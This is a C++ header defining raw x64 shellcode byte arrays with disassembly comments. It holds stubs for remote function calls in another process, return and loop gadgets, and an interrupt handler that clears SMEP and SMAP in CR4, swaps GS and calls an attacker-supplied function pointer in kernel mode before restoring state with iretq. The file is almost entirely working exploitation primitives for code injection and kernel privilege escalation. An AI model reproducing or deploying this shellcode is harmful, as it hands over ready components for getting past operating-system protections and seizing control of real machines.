#pragma once
#include <cstdint>

class ShellCode_CallRax {
	//sub rsp,78
	//call rax
	//add rsp,78
	uint8_t ShellCode[0xa] = {
		0x48, 0x83, 0xEC, 0x78,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x78
	};
};
class ShellCode_Loop { uint8_t ShellCode[0x2] = { 0xEB, 0xFE }; };
class ShellCode_Ret { uint8_t ShellCode[0x1] = { 0xC3 }; };
class ShellCode_Ret0 { uint8_t ShellCode[0x3] = { 0x31, 0xC0, 0xC3 }; };
class ShellCode_Ret1 { uint8_t ShellCode[0x5] = { 0x31, 0xC0, 0xFF, 0xC0, 0xC3 }; };
class ShellCode_JmpRax { uint8_t ShellCode[0x3] = { 0xFF, 0xE0 }; };

class ShellCode_CallRaxRet {
	ShellCode_CallRax shellcode1;
	ShellCode_Ret shellcode2;
};

class ShellCode_CallRaxLoop {
	ShellCode_CallRax shellcode1;
	ShellCode_Loop shellcode2;
public:
	constexpr static size_t OffsetLoopOpcode = sizeof(shellcode1);
};

class ShellCode_RemoteCall {
private:
	//2E6C4CD0000 - 48 B8 0000000000000000	- mov rax, 0
	//2E6C4CD000A - 48 B9 0000000000000000	- mov rcx, 0
	//2E6C4CD0014 - 48 BA 0000000000000000	- mov rdx, 0
	//2E6C4CD001E - 49 B8 0000000000000000	- mov r8, 0
	//2E6C4CD0028 - 49 B9 0000000000000000	- mov r9, 0
	//2E6C4CD0032 - 48 83 EC 70				- sub rsp, 70
	//2E6C4CD0036 - FF D0					- call rax
	//2E6C4CD0038 - 48 83 C4 70				- add rsp, 70 
	//2E6C4CD003C - 90						- nop
	//2E6C4CD003D - 90						- nop
	//2E6C4CD003E - 90						- nop
	//2E6C4CD003F - 90						- nop
	//2E6C4CD0040 - 48 89 05 09000000		- mov[2E6C4CD0050], rax
	//2E6C4CD0047 - C3						- ret
	uint8_t ShellCode[0x50] = {
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x49, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x49, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x83, 0xEC, 0x70,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x70,
		0x90, 0x90, 0x90, 0x90,
		0x48, 0x89, 0x05, 0x09, 0x00, 0x00, 0x00,
		0xC3,
	};
	uint64_t ReturnRaxValue = 0;

public:
	template<class PTR, class A1, class A2, class A3, class A4>
	ShellCode_RemoteCall(PTR pFunc, A1 a1 = 0, A2 a2 = 0, A3 a3 = 0, A4 a4 = 0) {
		*(uintptr_t*)(ShellCode + 0x00 + 0x2) = (uintptr_t)pFunc;
		*(uintptr_t*)(ShellCode + 0x0A + 0x2) = (uintptr_t)a1;
		*(uintptr_t*)(ShellCode + 0x14 + 0x2) = (uintptr_t)a2;
		*(uintptr_t*)(ShellCode + 0x1E + 0x2) = (uintptr_t)a3;
		*(uintptr_t*)(ShellCode + 0x28 + 0x2) = (uintptr_t)a4;
	}

	uint64_t GetReturnValue() const { return ReturnRaxValue; }
};

template<size_t N>
class ShellCode_CC {
	uint8_t _[N];
public:
	ShellCode_CC() {
		for (auto i = 0; i < N; i++)
			_[i] = 0xCC;
	}
};

class ShellCode_IntHandler {
	uint8_t _[0x3D] = {
		0x48, 0x8B, 0x0C, 0x24,					//mov rcx,[rsp]
		0x48, 0x83, 0xC4, 0x08,					//add rsp,08					-> Errorcode must be popped for stack align.

		0x48, 0x0F, 0x20, 0xE0,					//mov rax,cr4
		0x50,									//push rax						-> Save CR4
		0x48, 0x25, 0xFF, 0xFF, 0xCF, 0xFF,		//and rax,FFFF FFFF FFCF FFFF	-> Disable SMAP, SMEP
		0x48, 0x0F, 0x22, 0xE0,					//mov cr4,rax

		0x48, 0x8B, 0x41, 0x08,					//mov rax,[rcx+08]
		0x48, 0x8B, 0x09,						//mov rcx,[rcx]

		0x0F, 0x01, 0xCB,						//stac
		0x0F, 0x01, 0xF8,						//swapgs
		0xFB,									//sti
		0x48, 0x83, 0xEC, 0x20,					//sub rsp,20
		0xFF, 0xD0,								//call rax
		0x48, 0x83, 0xC4, 0x20,					//add rsp,20
		0xFA,									//cli
		0x0F, 0x01, 0xF8,						//swapgs
		0x0F, 0x01, 0xCA,						//clac

		0x58,									//pop rax
		0x48, 0x0F, 0x22, 0xE0,					//mov cr4,rax					-> Restore CR4
		0x48, 0xCF								//iretq
	};
};